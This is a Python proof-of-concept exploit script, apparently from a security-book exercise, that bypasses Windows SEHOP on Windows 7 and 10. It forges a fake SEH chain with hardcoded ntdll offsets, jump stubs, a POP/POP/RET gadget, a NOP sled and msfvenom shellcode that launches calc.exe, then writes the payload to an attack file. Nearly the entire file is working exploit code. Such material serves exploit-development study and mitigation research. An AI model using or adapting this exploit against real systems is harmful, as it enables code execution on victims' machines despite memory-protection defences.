# Exploit to bypass Structured Exception Handling Overwrite Protection (SEHOP)
# by crafting a fake SEH chain on the stack.
#
# Tested on Microsoft Windows 7 Ultimate (6.1.7601 Service Pack 1 Build 7601)
#       and Microsoft Windows 10 Pro (10.0.17134 N/A Build 17134)
#
# Crafted with love by e3prom (github.com/e3prom).
#
# PoC codes and more available at:
# https://github.com/e3prom/miscsec/tree/master/GHHv5-SEHOP-Bypass
import struct
from ctypes import windll

kernel32 = windll.kernel32

target_os = 0               # 0 = Microsoft Windows 7
                            # 1 = Microsoft Windows 10

def loadDLL(dll_name):
    try:
        windll.LoadLibrary(dll_name)
    except WindowsError:
        print "Cannot load DLL %s" % dll_name

    base_addr = kernel32.GetModuleHandleA(dll_name)
    return base_addr

def findFinalEH(target_os):
    if target_os == 0:
        # On Windows 7, the handler address seems to be static even with ASLR.
        # The below offset may be different on your target operating system.
        return loadDLL("ntdll.dll") + 0xBAC12
    elif target_os == 1:
        # On Windows 10, the last byte seems to be randomized in a +/- 30 bytes
        # range. You may need to launch the exploit multiple times to hit the
        # correct handler address.
        return loadDLL("ntdll.dll") + 0x7EC21

def main():
    file = 'attack.bin'

    jmp1 = "\xEB\x0D\x90\x90"
    jmp2 = "\xEB\x0A\x90"                       # operand value '0xA' will
                                                # null-terminate, so we remove one byte.
    seh = struct.pack("<L", 0x10001004)         # XOR EAX,EAX
						# POP EDI
						# POP EBP
						# RETN
    fake_nseh = struct.pack("<L", 0xFFFFFFFF)   # Fake NSEH pointer.
    fake_seh = struct.pack("<L", findFinalEH(target_os)) # Fake SEH handler.
    if target_os == 0:
        nseh = struct.pack("<L", 0x0012F974)    # jump back on the stack toward
						# lower memory addresses.
        nopsled = "\x90" * 84
    elif target_os == 1:
        nseh = struct.pack("<L", 0x0019F974)    # On Win10 the stack is aligned a little bit differently.
        nopsled = "\x90" * (84 + 8)             # Ensure the Fake NSEH is properly pointed by
                                                # the nseh pointer by sizing the nopsled accordingly.
                                                
    # msfvenom -p windows/exec -b "\x00\x0a" CMD=calc.exe -f python -v scode
    scode =  "\x90\x90\x90\x90"                 # Added four nops to accodomate some imprecision with jmp2.
    scode += "\xd9\xca\xd9\x74\x24\xf4\xbf\x8e\xee\xaf\xc7\x58\x2b"
    scode += "\xc9\xb1\x31\x83\xe8\xfc\x31\x78\x14\x03\x78\x9a\x0c"
    scode += "\x5a\x3b\x4a\x52\xa5\xc4\x8a\x33\x2f\x21\xbb\x73\x4b"
    scode += "\x21\xeb\x43\x1f\x67\x07\x2f\x4d\x9c\x9c\x5d\x5a\x93"
    scode += "\x15\xeb\xbc\x9a\xa6\x40\xfc\xbd\x24\x9b\xd1\x1d\x15"
    scode += "\x54\x24\x5f\x52\x89\xc5\x0d\x0b\xc5\x78\xa2\x38\x93"
    scode += "\x40\x49\x72\x35\xc1\xae\xc2\x34\xe0\x60\x59\x6f\x22"
    scode += "\x82\x8e\x1b\x6b\x9c\xd3\x26\x25\x17\x27\xdc\xb4\xf1"
    scode += "\x76\x1d\x1a\x3c\xb7\xec\x62\x78\x7f\x0f\x11\x70\x7c"
    scode += "\xb2\x22\x47\xff\x68\xa6\x5c\xa7\xfb\x10\xb9\x56\x2f"
    scode += "\xc6\x4a\x54\x84\x8c\x15\x78\x1b\x40\x2e\x84\x90\x67"
    scode += "\xe1\x0d\xe2\x43\x25\x56\xb0\xea\x7c\x32\x17\x12\x9e"
    scode += "\x9d\xc8\xb6\xd4\x33\x1c\xcb\xb6\x59\xe3\x59\xcd\x2f"
    scode += "\xe3\x61\xce\x1f\x8c\x50\x45\xf0\xcb\x6c\x8c\xb5\x24"
    scode += "\x27\x8d\x9f\xac\xee\x47\xa2\xb0\x10\xb2\xe0\xcc\x92"
    scode += "\x37\x98\x2a\x8a\x3d\x9d\x77\x0c\xad\xef\xe8\xf9\xd1"
    scode += "\x5c\x08\x28\xb2\x03\x9a\xb0\x1b\xa6\x1a\x52\x64"
    pad = "A" * (400-len(nopsled+jmp2+fake_nseh+fake_seh+scode))
    payload = "\x90" * (508-4) + jmp1 + nseh + seh + nopsled + jmp2 + fake_nseh + fake_seh + scode + pad

    f = open(file, 'w')
    f.write(payload)
    print "Wrote attack file to %s" % file
    f.close()
    print "Exiting..."

if __name__ == "__main__":
    main()
